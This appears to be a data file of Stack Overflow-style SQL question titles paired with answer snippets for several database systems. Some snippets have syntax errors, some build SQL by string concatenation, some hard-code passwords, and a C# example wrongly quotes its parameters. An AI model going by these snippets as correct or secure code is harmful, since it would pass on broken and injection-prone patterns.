  select 'Spain', 'Madrid', 2014, 6, 1 from dual union all
  select 'Spain', 'Madrid', 2014, 7, 1 from dual union all
  select 'Spain', 'Madrid', 2014, 8, 1 from dual union all
  select 'Spain', 'Madrid', 2014, 9, 1 from dual union all
  select 'Spain', 'Madrid', 2014, 10, 1 from dual union all
  select 'Spain', 'Madrid', 2014, 11, 1 from dual union all
  select 'Spain', 'Madrid', 2014, 12, 1 from dual union all
  select 'Spain', 'Madrid', 2015, 1, 1 from dual union all
  select 'Spain', 'Madrid', 2015, 2, 1 from dual union all
  select 'UK', 'London', 2014, 7, 10 from dual union all
  select 'UK', 'London', 2014, 8, 10 from dual union all
  select 'UK', 'London', 2014, 9, 10 from dual union all
  select 'UK', 'London', 2014, 10, 10 from dual union all
  select 'UK', 'London', 2014, 11, 10 from dual union all
  select 'UK', 'London', 2014, 12, 10 from dual union all
  select 'UK', 'London', 2015, 1, 10 from dual union all
  select 'UK', 'London', 2015, 2, 10 from dual 
)
select country, city, year, month,
       sum(amount) over ( partition by country, city, year order by month)
from test
"
25017,38248,SQL Query where records exist except,"SELECT 
    * 
FROM 
    [table1]

INNER JOIN [table2] 
ON [table1].MemberNum = [table2].MEMBERNUM

LEFT OUTER JOIN [Table3]
ON 
    table1.CardID = table3.CardID

WHERE 
    [table1].CardID<>[table2].cardid
AND (
    CAST(COALESCE(table3.enddate, DATEADD(dd,-1,GETDATE()) AS DATE) <= GETDATE()
    )
"
3233,7312,"In Access 2010 I would like to find the % by MCO where data > 40. Not the % of total count by MCO, but rather % by count for each MCO","SELECT 
    tblMCOs.MCOs, 
    SUM(IIF(tblMCOs.data > 40, 1, 0)) / SUM(1)
FROM 
    tblMCOs
GROUP BY 
    tblMCOs.MCOs
ORDER BY 
    tblMCOs.MCOs;
"
11175,21291,Get postion of group in MySQL,"select
    t.id,
    t.datum,
    t.rank,
    t.name
from ( 
    select
        s.id,
        s.datum,
        s.name,
        s.points,
        If(@datum <> s.datum, @rank := 1, @rank := @rank + 1) as rank, 
        @datum := s.datum
    from
        score_table s
            cross join (
            select
                @rank := null,
                @datum := '1980-01-01'
        ) as r 
    order by
        s.datum,
        s.points desc
    ) as t
order by 
    t.id,
    t.rank;
"
10855,54708,Prolog - Exercise on facts and lists,"reduced(List) :-
    List = [ Price || producte(_, Price, reduced) ].
"
21168,29408,SQL: Executing a query to dynamic remote server,"SET @Sql = 'SELECT * FROM [' + @RemoteServer + '].dbname.schema.tblCustomers'
EXEC @Sql
"
2817,37203,How to check if a view exists that uses a table,"SELECT  *
FROM    INFORMATION_SCHEMA.VIEW_TABLE_USAGE
WHERE   TABLE_SCHEMA = 'dbo'    --(or whatever your Schema name is)
  AND   TABLE_NAME   = 'YourTableName'
"
38606,28855,If no data then don't create empty file,"CREATE OR REPLACE PROCEDURE VR_AD_INTEGRATION_EXPORT AS
     l_v_file UTL_FILE.file_type;
     l_filename varchar2(128);  
     f_exists boolean;
     f_size pls_integer;
     f_blk_size pls_integer;
BEGIN  
    l_filename := 'HRMtoAD1_'||to_char(sysdate,'YYYYMMDD')||'_'||to_char(sysdate,'HH24MISS');
    l_v_file := UTL_FILE.fopen('integration',  l_filename , 'w', 32767); 
    FOR x IN (SELECT * FROM (SELECT
             decode(pid, NULL, RPAD(' ',7,' '), RPAD(user_id, 7, ' '))|| '' ||            decode(name_last, NULL, RPAD(' ',50,' '), RPAD(name_last, 50, ' '))
            str 
                 FROM vr_ad_integration 
                 WHERE integrated = 'N') str 
         WHERE rownum <= 1000 ORDER BY rownum) LOOP
     BEGIN
         UTL_FILE.put_line(l_v_file, x.str);
     END; 
    END LOOP; 
    utl_file.fgetattr('integration',  l_filename , f_exists, f_size, f_blk_size);
    if f_size > 0 then
        UTL_FILE.fflush(l_v_file); 
        UTL_FILE.fclose(l_v_file); 
    else
        UTL_FILE.fclose(l_v_file); 
        utl_file.fremove('integration',  l_filename);
    end if;
END VR_AD_INTEGRATION_EXPORT; 
"
36727,56461,SQL Server--Is it possible to work around using a temporary table for a query that filters based on an alias case column?,";WITH RS1 as (
  SELECT t1.*,
  CASE WHEN t3.MTemp > t3.MTempLimit
    then 1
        when t3.TotHours > t3.THoursLimit
            then 1
            else 0
  end  [Overdue]
  from table_1 t1
  LEFT JOIN table_2 t2 on t1.ResNo = t2.ResNo and t1.PCode = t2.PCode 
  LEFT JOIN table_3 t3 on t2.RepJobNo = t3.RepJobNo
  LEFT JOIN table_4 t4 on t4.TypeID = t2.RepType
      WHERE t2.RepStat = 1
 ), RS2 as (
     select *,ROW_NUMBER() OVER (ORDER BY Overdue DESC) rn
     from RS1
 )
 select * from RS2 where rn = 1
"
2259,10950,MySQL report -- fill in empty dates,"select c.thedate, oi.sku, sum(price) as total
from (select date('2014-11-01') as thedate union all
             date('2014-11-02') as thedate union all
             date('2014-11-03') as thedate union all
             date('2014-11-04') as thedate union all
             date('2014-11-05') as thedate union all
             date('2014-11-06') as thedate union all
             date('2014-11-07') as thedate union all
             date('2014-11-08') as thedate union all
             date('2014-11-09') as thedate union all
             date('2014-11-10') as thedate union all
             date('2014-11-11') as thedate union all
             date('2014-11-12') as thedate
      ) c left join
      order_items oi
      on c.thedate = date(oi.created_on)
where oi.created_on between FROM_UNIXTIME(1415577600) AND NOW()
group by ci.thedate, oi.sku
"
25003,65953,Sum of working days with date ranges from multiple records (overlapping),"SELECT ""Employee_id"",
       SUM( ""work_end_date"" - ""work_start_date"" )
FROM(
  SELECT ""Employee_id"",
         ""work_start_date"" ,
         lead( ""work_start_date"" ) 
             over (Partition by ""Employee_id""
                  Order by ""Employee_id"", ""work_start_date"" ) 
         As ""work_end_date""
  FROM (
     SELECT ""Employee_id"", ""work_start_date""
     FROM Table1
     UNION
     SELECT ""Employee_id"",""work_end_date""
     FROM Table1
  ) x
) x
WHERE EXISTS (
   SELECT 1 FROM Table1 t
   WHERE t.""work_start_date"" > x.""work_end_date""
     AND t.""work_end_date"" > x.""work_start_date""
      OR t.""work_start_date"" = x.""work_start_date""
     AND t.""work_end_date"" =  x.""work_end_date""
)
GROUP BY ""Employee_id""
;
"
23502,52876,SQL Select and Delete help,"select * from table where ID IN(1,2,3,4,5)
"
9015,11552,sql cross reference table,"CREATE UNIQUE INDEX idx_no_dupes 
    ON your_table (least(source_ip, destination_ip), greatest(source_ip, destination_ip));
"
38630,50155,Simple definition: query or sub-query?,"USE AdventureWorks2008R2;
GO
SELECT Ord.SalesOrderID, Ord.OrderDate,
    (SELECT MAX(OrdDet.UnitPrice)
     FROM AdventureWorks.Sales.SalesOrderDetail AS OrdDet
     WHERE Ord.SalesOrderID = OrdDet.SalesOrderID) AS MaxUnitPrice
FROM AdventureWorks2008R2.Sales.SalesOrderHeader AS Ord
"
11302,64523,SAS datastep/SQL select latest record from multiple records with same ID,"select id,max(Date)
from yourtable
group by id;
"
4819,53802,How to check all column names of Tables in oracle with regex?,"SELECT column_name, table_name FROM user_tab_columns WHERE column_name like '%CURRENCY%' OR column_name Like '%COUNTRY%';
"
114,16973,Is this possible in SQL?,"select a.claim_ID
from   TableA a, 
       TableB term, 
       TableB paid
where  a.claim_id  =  term.claim_id
and    a.claim_id  =  paid.claim_id
and    term.Claim State  = 'TERMINATED'
and    paid.Claim State  = 'PAID'
and    term.Claim_State_Start_Date >= paid.Claim_State_Start_Date
"
22439,60151,select first row/transaction based on 3 columns,"SELECT DATEADD(dd, 0, DATEDIFF(dd, 0, evnt_dat)) evnt_dat, 
       evnt_descrp, panel_descrp, lname, fname, cardno
  FROM
(
  SELECT evnt_dat, evnt_descrp, panel_descrp, lname, fname, cardno,
         ROW_NUMBER() OVER (PARTITION BY evnt_descrp, panel_descrp, lname, fname, 
                            DATEADD(dd, 0, DATEDIFF(dd, 0, evnt_dat)) ORDER BY evnt_dat) rnum
    FROM ev_log
) q
 WHERE rnum = 1
 ORDER BY evnt_dat, evnt_descrp, panel_descrp, lname, fname;
"
37386,65907,convert date to integer in postgresql,"select date '2011-11-01' - date '1900-01-01'
"
28073,42711,"Sql problems , Select from 3 tables","SELECT
    S.NameS
FROM
    Student
INNER JOIN Subscrib SUB ON SUB.CodS = S.CodS
INNER JOIN Discipline D ON D.CodD = SUB.CodD AND D.YearD = 2
GROUP BY
    S.NameS
HAVING
    COUNT(*) = (SELECT COUNT(*) FROM Discipline WHERE YearD = 2)
"
31187,9323,SQL How to select max dates from results of a join,"SELECT    Oils.OilID, Oils.ShipID, ROB.LastROB, ROB.Received, ROB.DateReceived,  
          ROB.PortReceived, ROB.TotalUsed, ROB.CurrentROB, ROB.DateSent 
FROM  
          ( 
           SELECT DISTINCT OilID, ShipID  
           FROM   [Index]  
           WHERE  ShipID = [QueryShipID] 
          ) AS Oils             
LEFT JOIN   
          ( 
           SELECT ShipID, OilId, LastROB, Received, DateReceived, PortReceived,  
                  TotalUsed, CurrentROB, DateSent  
           FROM   [Oil ROB]  
          )  AS ROB ON Oils.ShipID = ROB.ShipID AND Oils.OilID = ROB.OilID
WHERE     ROB.DateSent = ( 
                          SELECT MAX(DateSent)  
                          FROM   [Oil ROB]  
                          WHERE  ShipID = ROB.ShipID AND  
                                 OilID = ROB.OilID
                         );
"
15154,44765,SQL Query to pull the avg values for 1day gap dob's of clients,"select t1.ClientID, 
       t1.ClinetDOBs,
       (t1.Slaries + sum (t2.Slaries)) / (count (*) + 1) Avg_Slaries
  from table1 t1
 inner join table1 t2
    on t1.ClinetDOBs = dateadd(day, 1, t2.ClinetDOBs)
 group by t1.ClientID, 
       t1.ClinetDOBs,
       t1.Slaries
"
21534,41320,Get Number of Weeks that have passed from a certain date to today SQL,"SELECT DATEDIFF(wk, '2012-08-20', '2014-06-27');
"
14676,38123,What is actually going on with HAVING clause here?,"select  * 
from    (
    select      MODEL, 
                ITEM_TYPE, 
                PRICE, 
                avg(PRICE) over( 
                   partition by MANUFACTURER_NAME, ITEM_TYPE 
                ) as AVG_PRICE
    from        ITEMS
    ) as ITEMS_WITH_AVG
where  PRICE > AVG_PRICE
"
39431,21480,"is it possible to ""backup"" row/table with mysqldump or whatever","
#!/usr/bin/perl
use strict;
use DBI;
my $dbh = DBI->connect( ""dbi:mysql:database=;mysql_client_found_rows=0;host=your.database.host"", ""username"", ""password"", {RaiseError => 1});
my $databases = $dbh->selectcol_arrayref('SHOW databases;');
foreach my $t (@{$databases}) {
   system('/usr/local/bin/mysqldump -h your.database.host --add-drop-database --add-drop-table --add-locks --extended-insert=false --databases --allow-keywords -c -e -f -u username  --password=password \''.$t.'\' > /path/to/backupfiles/'.$t.'.sql');
   print ""$t done\n"";
   sleep(2);
}
"
5446,26958,SQL WHERE command with multiple operators,"WHERE (pr_label = 'C1')
    OR (pr_label = 'C2' AND pr_quantity > 0)
"
39950,41620,Make column values in a table have equal number of characters,"select 
    left(fieldID, 1) + 
    right('000000' + right(fieldID, len(fieldID) - 1), 5)
from DomainDetail
"
39976,32365,Using MAX for date but adding column to group on 'breaks' the query - sub query?,"select * from
(
     SELECT Location,Date, Type, Notes, Row_Number() Over (Partition By Location, Type order by date desc) RN 
     FROM
          NotesTable a
           INNER JOIN Location b on a.LocationID = b.LocationID
           INNER JOIN Type c on a.typeid = c.typeid
      WHERE typeid <> 8
) v
WHERE rn = 1 
"
3814,57036,Convert this query to Linq to SQL,"var drdrs = db.Doctors.Except(
  (from x in db.DrPatientXrefs
  join d in db.Doctors on d.DoctorId equals x.DoctorId
  where x.PatientId == patientId // probably not needed...
  select d)
).ToList();
"
21427,56889,"select statement inside an inner join, not showing select fields","SELECT  DISTINCT
        t1.Name,
        t1.School,
        t1.Major,
        t2.Address,
        t2.Phone,
        t2.Email
FROM    Table1 AS t1
        INNER JOIN Table2 AS t2
            ON t1.ID = t2.ID
"
11553,62218,How to do a 10% 45% 45% Split in SQL Server,"SELECT Email,
       (CASE WHEN seqnum <= cnt * 0.10 THEN 'Group1'
             WHEN seqnum <= cnt * (0.10 + 0.45) THEN 'Group2'
             ELSE 'Group3'
        END) as [Group]
FROM (SELECT email, optDate, 
             row_number() over (order by newid()) as seqnum,
             count(*) over () as cnt
      FROM t
     ) t;
"
35058,14320,HOw to merge two rows into one adding last column if the row's first and second columns are equal,"SELECT  a, b, SUM(val)
FROM    YourTable
GROUP BY
        a, b
"
12936,9613,Returning data from or sql statement,"$sql = ""SELECT * FROM {$this->_table} WHERE comm IN ($idfrom$idto, $idto$idfrom);"";
"
1365,53587,How to calculate difference between two rows in a date interval?,"SELECT
 ItmDtIni.PO
,ItmDtIni.POItem AS [PO Item]
,ROUND(ItmDtIni.QtyPending - ItmDtEnd.QtyPending, 3) AS [Qty Delivered]
,ROUND((ItmDtIni.QtyPending - ItmDtEnd.QtyPending) * ItmDtEnd.Price, 2) AS [Value delivered(US$)]
//Filtering subqueries to bring only the items in the date interval to make a self join
FROM (((SELECT
        PO
       ,POItem
       ,QtyPending
       ,MIN(Date) AS MinDate
       FROM Item
       WHERE Date BETWEEN FORMAT(begin_date, 'dd/mm/yyyy') AND FORMAT(end_date, 'dd/mm/yyyy')
       GROUP BY
        PO
       ,POItem
       ,QtyPending) AS ItmDtIni
//Self join filtering to bring only items in the date interval with the previously filtered table
INNER JOIN (SELECT
            PO
           ,POItem
           ,QtyPending
           ,Price
           ,MAX(Date) AS MaxDate
           FROM Item
           WHERE Date BETWEEN FORMAT(begin_date, 'dd/mm/yyyy') AND FORMAT(end_date, 'dd/mm/yyyy')
           GROUP BY
            PO
           ,POItem
           ,QtyPending
           ,Price) AS ItmDtEnd
  ON ItmDtIni.PO = ItmDtEnd.PO
  AND ItmDtIni.POItem = ItmDtEnd.POItem)
INNER JOIN PO
  ON ItmDtEnd.PO = PO.Numero)
WHERE
//Showing only items that had a variation in the date interval
      ROUND(ItmDtIni.QtyPending - ItmDtEnd.QtyPending, 3) <> 0
//Anchoring min date in the interval for each item found by the first subquery
      AND ItmDtIni.MinDate = (SELECT MIN(Item.Date)
                              FROM Item
                              WHERE
                                    ItmDtIni.PO = Item.PO
                                AND ItmDtIni.POItem = Item.POItem
                                AND Date BETWEEN FORMAT(begin_date, 'dd/mm/yyyy') AND FORMAT(end_date, 'dd/mm/yyyy'))
//Anchoring max date in the interval for each item found by the second subquery  
  AND ItmDtEnd.MaxDate = (SELECT MAX(Item.Date)
                          FROM Item
                          WHERE
                                ItmDtEnd.PO = Item.PO
                            AND ItmDtEnd.POItem = Item.POItem
                            AND Date BETWEEN FORMAT(begin_date, 'dd/mm/yyyy') AND FORMAT(end_date, 'dd/mm/yyyy'))
"
22638,33246,How to rank users and get a subset from this rank with my user and the above and below user by rank position,"with s as (
    select
        users.id, users.name, total_profit,
        rank() over(order by total_profit desc) as r
    from
        users
        inner join
            (
                select sum(profits.amount) as total_profit,
                investor_id
                from profits
                group by profits.investor_id
            ) profits on profits.investor_id = users.id
), u as (
    select r from s where name = 'Kobe Bryant'
)
select distinct on (r) id, name, total_profit, r
from s
where
    name = 'Kobe Bryant'
    or r in (
        (select r from u) - 1, (select r from u) + 1
    )
order by r;
"
12343,5336,one sql instead of 2 for counting,"Select 
SUM(case when substr(id,1, 1) in (1,2) then 1 else 0 end) as M, 
SUM(case when substr(id,1, 1) in (3,4) then 1 else 0 end) as F 
from users where activated=1
"
15527,44820,How do I remove all tables and not the schema in Postgresql?,"select 'drop table if exists ""' || tablename || '"" cascade;' 
  from pg_tables
 where schemaname = 'jason'; 
"
1595,46203,self join query,"for each row in phone_numbers h /* Note this is ALL home AND cell phones */
   select c.number from phone_numbers c
   where h.person_id = c.person_id
   and h.type = 'home'
   and c.type = 'cell';
   if c.number is null (i.e. no row found)
     display h.*
   end if
end loop;
"
25890,51380,SQL Max get the highest id,"SELECT 
    c.clientid, c.clientname, c.billingdate, 
    i.total - (select ifnull(sum(p.amount), 0) from payment p 
               where p.invoice = i.invoiceid Order by i.invoiceid) AS remaining 
FROM 
    client c 
INNER JOIN 
    invoice i 
WHERE 
    c.clientid = i.client 
AND i.invoiceid = (SELECT MAX(i2.invoiceid) FROM invoice i2 WHERE i2.client = i.client) 
ORDER BY 
    clientname
"
19295,5860,Updating timestamp column with new value - value of existing column in oracle,"update test 
   set col1 = TO_TIMESTAMP('""+newDate+"" 00.00.00.000000000','DD-MM-YYYY HH24: MI:SS:FF') - col2
 where objid IN (1,2);
"
16477,53414,Checking rows that are not numbers in a varchar column for MySQL Query,"    SELECT * FROM myTable WHERE concat('',col1 * 1) != col1
"
24730,43488,SQL Query to concatenate strings or add default value,"SELECT 
  CODPROY, 
  DESCPROY, 
  USER, 
  CODPROY + ' - ' + COALESCE(USER,'NOT AVAILABLE') + ' - ' + DESCPROY AS Expr 
FROM dbo.PROY
"
30964,59383,Arithmetic in SQL function using Joins,"-- sample tables
declare @Table1 table (Table1_ID int, Table2_ID int, Value numeric(18,2));
declare @Table2 table (Table2_ID int, Switch bit);
declare @Table3 table (Table3_ID int, Table1_ID int, Table2_ID int, X_Column numeric(18,2));

-- sample data
insert @Table1 values(100, 200, 5.00);
insert @Table1 values(100, 201, 10.00);
insert @Table2 values(200, 0);
insert @Table2 values(201, 1);
insert @Table3 values(300, 100, 200, 2.0);
insert @Table3 values(300, 100, 201, 2.5);

declare @X_Column numeric(18,2);
set @X_Column = 2.0;

select
    t1.Value * t3.X_Column
from @Table1 t1
join @Table2 t2 on t2.Table2_ID = t1.Table2_ID
join @Table3 t3 on t3.Table2_ID = t2.Table2_ID
where t3.X_Column = @X_Column
"
25732,31908,How define column a OR column b NOT NULL?,"create table football_players (
    id VARCHAR(36) PRIMARY KEY,
    name VARCHAR(20),
    surname VARCHAR(20),
    constraint chk_name_surname check (name is not null or surname is not null)
);
"
34271,43885,Getting last post user id (MySQL),"SELECT T1.`count`, T1.last_post_id, T1.topic_id, T2.user_id
FROM (
    SELECT 
        COUNT(id) AS `count`,
        MAX(id) AS last_post_id,
        topic_id, 
    FROM forum_posts
    WHERE topic_id IN (326, 207, 251) 
    GROUP BY topic_id
) T1
JOIN forum_posts T2
ON T1.last_post_id = T2.id
"
3240,35301,Bad value returned using EXISTS,"UPDATE t
   SET SALES_YEAR = sa.fiscalyear 
FROM #Temp t
WHERE t.product_id = (Select TOP 1 sa.productid
                      FROM sales sa JOIN
                           products p
                           ON p.id = sa.productid
                      ORDER BY sa.fiscalyear
                     )
"
29079,2850,SQL - Select multiple users from a table asoiciated with multiple options AKA Relations division,"SELECT `user`
FROM tablename 
WHERE `option` in ('A', 'D')
GROUP BY `user`
HAVING COUNT(DISTINCT `option`) = 2;
"
9974,44286,Convert Ordinal Number format to Number,"create table t (w varchar2(30));

insert into t values ('First');
insert into t values ('THIRD');
insert into t values ('eleventh');
insert into t values ('Twenty-eighth');
insert into t values ('two hundred fifty sixth');

select 
  t.w, dict.n
from t
left join (
  select
    level n,
    regexp_replace(to_char(to_date(level,'J'),'fmJSPTH'),'[^A-Z]') w
  FROM dual
  connect by level <= 1000
) dict on regexp_replace(upper(t.w),'[^A-Z]')=dict.w
"
37374,46776,Modifying Primary Index of a table in Teradata,"alter table <TableName> modify primary index Index_Name(col1, col2, ...);
"
6146,44390,mysql select with priority of 3 filelds in a query,"SELECT * 
  FROM `work_result` 
 WHERE date_format(concat(year,'-',month,'-',day), '%Y-%m-%d') > 
         DATE_FORMAT(FROM_UNIXTIME(`yourDateGoesHere`), '%Y-%m-%d')
"
4502,68316,Oracle mystery with filtering a query on numbers,"DECLARE
 vRESTORE_ID NUMBER;
 vcounts NUMBER;
BEGIN
vRESTORE_ID := 100014;
SELECT COUNT(te.UPDATE_ID) 
INTO vcounts 
FROM TB_ENT te 
WHERE te.UPDATE_ID = vRESTORE_ID;
DBMS_OUTPUT.PUT_LINE(vcounts);
END;
"
25716,27769,mysql query WHERE in one table but not the other,"SELECT DISTINCT profileid 
FROM profilesrelevation 
WHERE profileid NOT IN (
  SELECT profileid FROM profiles
)
"
19049,3823,Any Advice with Mysql Count,"SELECT CLASS, COUNT(*) AS CNT
FROM table
GROUP BY CASE WHEN CLASS='M' THEN '11' ELSE CLASS END
"
22100,46358,SQL - Query records within an undefined interval,"SELECT N1.CustomerID, COUNT(N2.OrderDate)  FROM Northwind N1
INNER JOIN Northwind N2
ON N1.CustomerID=N2.CustomerID
AND N1.OrderDate<=Dateadd(MONTH, 6, N2.OrderDate)
GROUP BY N1.CustomerID
HAVING COUNT(N2.OrderDate)>=3
"
21114,60093,How to design database table for working hours?,"SELECT datediff(hh,'2011-08-30 04:47','2011-08-30 05:48') as [Hour(s) Worked]
Hour(s) Worked
--------------
1
"
290,17617,Row level sum of values,"with allDates (date) as
(
    select requestDate from dbo.bugs
    union select closedDate from dbo.bugs
)
select date,
    (select count(*) from dbo.bugs where requestDate = a.date) as bugsRequested,
    (select count(*) from dbo.bugs where closedDate = a.date) as bugsClosed,
    (select count(*) from dbo.bugs where a.date between requestDate and closedDate) AS bugsOpen,
    (select count(*) from dbo.bugs where closedDate<=a.date) AS totalClosed
from allDates a
"
2422,13635,Increment a varchar in SQL,"update 
    [table] 
set [nxt_no] = case when PATINDEX('%[0-9]%', [nxt_no]) > 0 then 
          left([nxt_no], PATINDEX('%[0-9]%', [nxt_no])-1) -- Text part
          + -- concat
          right( REPLICATE('0', LEN([nxt_no]) - PATINDEX('%[0-9]%', [nxt_no])+1) + convert( varchar, convert(int, right([nxt_no], LEN([nxt_no]) - PATINDEX('%[0-9]%', [nxt_no])+1))+1), LEN([nxt_no]) - PATINDEX('%[0-9]%', [nxt_no])+1)
else 
    [nxt_no] end
"
1692,545,SQL getting data using other table + a value,"select * from following f
inner join users u on f.user_id = u.user_id
where u.user_id = X
and u.fullname like '%a%'
"
11152,13384,Query IN that matches all,"select distinct Report_id 
   from Template T
   where Template_id in ('d','e')
   and NOT EXISTS 
      (select T1.Report_id 
        from Template T1
        where Template_id not in ('d','e')
        and T.Report_id=T1.Report_id)
"
1114,37098,how to insert row in SQL database in ADO.Net Connection oriented mode,"private void btnadd_Click(object sender, EventArgs e)
{
  try
  {
   //create  object  of Connection Class..................
   SqlConnection con = new SqlConnection();

   // Set Connection String property of Connection object..................
  con.ConnectionString = ""Data Source=KUSH-PC;Initial Catalog=test;Integrated           Security=True"";

 // Open Connection..................
  con.Open();

 //Create object of Command Class................
 SqlCommand cmd = new SqlCommand();

//set Connection Property  of  Command object.............
cmd.Connection = con;
//Set Command type of command object
//1.StoredProcedure
//2.TableDirect
//3.Text   (By Default)

cmd.CommandType = CommandType.Text;

//Set Command text Property of command object.........

cmd.CommandText = ""Insert into Registration (Username, password) values ('@user','@pass')"";

//Assign values as `parameter`. It avoids `SQL Injection`
cmd.Parameters.AddWithValue(""user"", TextBox1.text);
cmd.Parameters.AddWithValue(""pass"", TextBox2.text);

 Execute command by calling following method................
  1.ExecuteNonQuery()
       This is used for insert,delete,update command...........
  2.ExecuteScalar()
       This returns a single value .........(used only for select command)
  3.ExecuteReader()
     Return one or more than one record.

  cmd.ExecuteNonQuery();
  con.Close();


  MessageBox.Show(""Data Saved"");          
  }
     catch (Exception ex)
     {
            MessageBox.Show(ex.Message);
            con.Close();
     }


    }
"
39605,26691,Select all Users related to Company,"select Department.manager as user_id, Company.id
from Company
join Department on Department.company=Company.id

union

select Company.owner as user_id, Company.id
from Company
"
34463,52883,SQL get interection of values across multiple rows grouped by primary key,"SELECT code
FROM mytable
GROUP BY code
HAVING COUNT(*) = (SELECT COUNT(DISTINCT id) FROM mytable)
"
39646,53353,SQL Query Results where Join has NULL results,"SELECT  058.DESCRIPTION ""IRU"",
        111.job_ref ""Job Reference"",
        117.DESCRIPTION ""Status"",
        108.STATUS ""Fixed?"",
        105.DESCRIPTION ""Job Type"",
        111.POSTCODE ""Postcode"",
        111.site_id ""Site ID"",
        108.CONTRACT_START ""Contract Earliest"",
        108.CONTRACT_COMPLETION ""Contract Latest"",
        108.BOOKED_DURATION ""Planned Duration (mins)"",
        111.IMPORTANCE ""Importance"",
        111.CUSTOMER_NAME ""Customer Name"",
        100.expected_start ""Expected Start"",
        100.expected_end ""Expected End"",
        210.NAME ""Employee"",
        111.ON_HOLD ""On Hold?""
FROM    111_JOBS 111
        INNER JOIN 108_JOB_DETAILS 108
            ON 111.JOB_NO = 108.JOB_NO
        INNER JOIN 100_ACTIVITIES 100
            ON 111.JOB_NO = 100.JOB_NO
        LEFT JOIN 058_RESPONSIBILITY_UNITS 058          
            100.RESP_UNIT_NO = 058.RESP_UNIT_NO
        LEFT JOIN 105_ACTIVITY_TYPES 105
            ON 111.JOB_TYPE = 105.ACTIVITY_TYPE
        LEFT JOIN 210_EMPLOYEES 210
            ON 210.EMPLOYEE_NO = 100.EMPLOYEE_NO
        LEFT JOIN 117_STATUS_DESCRIPTIONS 117
            ON 117.STATUS = 100.ACTIVITY_STATUS
ORDER BY IRU, Employee, EXPECTED_START;
"
11794,49081,SQL JOIN query Optimization with subqueries,"select wkr.name as worker,txn.type as worktype,txn.payment_type as paymenttype,sum(txn.output)as totalkgs_ltrs,sum(txn.over_kgs)as overkgs_ltrs,
       sum(txn.names) as workedhrs,sum(txn.scrap) as scrap,sum(txn.cash_work_income) as cashworkincome,sum(txn.pss) as pss

from 
  bpl_daily_transaction_master txn
inner join res_company comp
   on comp.id = txn.bpl_company_id 
inner join bpl_division_n_registration div
   on div.id  = txn.bpl_division_id
inner join bpl_estate_n_registration est
   on est.id  = txn.bpl_estate_id
inner join bpl_worker wkr
   on wkr.id  = txn.worker_id

group by wkr.name,txn.type,txn.payment_type
"
34453,17115,Cross tables - 252 queries - Optimize,"select a.application_id, a.application_name_spanish, m.material_id, m.material_name_spanish,
       count(pm.product_id)
from t_applications a cross join
     t_materials m left join
     t_products_applications pa
     on pa.application_id = a.application_id left join
     t_products_materials pm
     on pm.product_id = pa.product_id and
        pm.material_id = m.material_id;
group by a.application_id, a.application_name_spanish, m.material_id, m.material_name_spanish,
order by a.application_id, m.material_id;
"
5757,71734,rank users based on count num,"SELECT
  groups.*,
  @rank:=@rank+1 AS rank
FROM
  (select 
    user,
    category,
    count(*) as num
  from 
    tblA
  where 
    category=1 
  group by 
    user, 
    category
  order by 
    num desc,
    user) AS groups
  CROSS JOIN (SELECT @rank:=0) AS init
"
33196,55657,Create zip file from SQL Server,"SET @Command = '""C:\Program Files\WinRAR\Rar.exe""  a -ep1 -pasd^^ad ' +@destination+' '+@source
"
1089,34589,sql update table set - The multi-part identifier could not be bound,"update t1
set t1.[Lattitude1] = t2.[Lattitude]
from table1 t1
left join table2 t2 
on (t1.StationID1 = t2.IDInfo)
"
3457,32830,insert rows into table with identity column,"INSERT INTO studio(name,country,income_money,movies) VALUES ('Walt Disney Studios','USA',45041000.99,50)
"
2523,3769,auditing all tables in a schema,"DECLARE
  l_sql_stmt varchar2(1000);
BEGIN
  FOR t IN (SELECT owner, table_name
              FROM all_tables
             WHERE owner like 'MYSCHEMA%')
  LOOP
    l_sql_stmt := 'AUDIT ALL ON ' || t.owner || '.' || t.table_name;
    EXECUTE IMMEDIATE l_sql_stmt;
  END LOOP;
END;
"
22722,14897,sql rows into columns pivot table,"DECLARE @staging TABLE
(
    id int NOT NULL,
    date_from datetime NOT NULL,
    date_to datetime NOT NULL,
    step int
)

INSERT INTO @staging
SELECT id, date_from, date_to,
    ROW_NUMBER() OVER(PARTITION BY id ORDER BY date_from, date_to)
FROM tblTemp

-- below is static for 3 levels, make below dynamic to match what you want
SELECT t1.id, t1.date_from, t1.date_to, t2.date_from, t2.date_to, t3.date_from, t3.date_to
FROM @staging t1 LEFT OUTER JOIN
    @staging t2 ON t1.id = t2.id AND t2.step = 2 LEFT OUTER JOIN
    @staging t3 ON t2.id = t3.id AND t3.step = 3
WHERE t1.step = 1
"
33602,51087,Tag all rows with the same values in Redshift SQL,"d1, i1, f1
d1, i2, f2
d2, i2, f3,
d3, i3, f3
"
17763,69190,How can I return a value in a select based on the value of another field?,"CREATE PROCEDURE [dbo].[get_tests] @UserTestId INT
AS
    SET NOCOUNT ON
    SELECT  A.CompletedDate,       
        A.ID,            
        CASE A.UserTestId WHEN @UserTestId THEN 1 ELSE 0 END AS Current,
   A.UserTestId,  
"
30783,48113,SQL query alignment change when Arabic characters are inserted,"SET QUOTED_IDENTIFIER OFF SET DATEFORMAT 'mdy' INSERT INTO ControlTreeEx (AccountID, TimeStamp, UserID, NodeID, Deleted, UserPriority,  ParentRecordID, NodeLevel, Name, NodeClass, DeviceID, DeviceType, SubTypeLevel)  VALUES (0, ""10/03/2002 02:33:39"", 0, 0, 0, 0, 0, 0, N'منطقة تحكم بالبداية', 7000, 0, 0, 0)
"
5395,45194,Fetch data from more then 5 tables from UserID common in MySQL,"SELECT
    columnName
FROM
(
    SELECT userID, columnName FROM tblcategory1
    UNION ALL
    SELECT userID, columnName FROM tblcategory2
    UNION ALL
    SELECT userID, columnName FROM tblcategory3
    UNION ALL
    SELECT userID, columnName FROM tblcategory4
    UNION ALL
    SELECT userID, columnName FROM tblcategory5
)
   ilvCategoryAll
WHERE
   userID = 1
"
2351,28832,dynamic sql count in a variable,"CREATE TABLE #Count(x int)
SELECT @sSQL = ""INSERT #Count SELECT COUNT(1) from ""+ @TMP_TABLE_NAME
execute (@sSQL)
SELECT @V_COUNT = x from #Count
DROP TABLE #Count
SELECT @LL_COUNT = (SELECT convert(NUMERIC(30,4), @V_COUNT))
SELECT @LL_COUNT
"
18596,31888,SQL - Adding a count to select clause,"SELECT name, COUNT(*) AS total_trends,
sum(if(dateTime BETWEEN '""&fromDate&""' AND '""&toDate&""' ,1,0)) as total_last_7_days,
((sum(if(dateTime BETWEEN '""&fromDate&""' AND '""&toDate&""' ,1,0)) /COUNT(*) ) *100)
as percentage                          // if you want to get only percentage
FROM trending_names
GROUP BY name
ORDER BY COUNT(*) DESC
LIMIT 10;
"
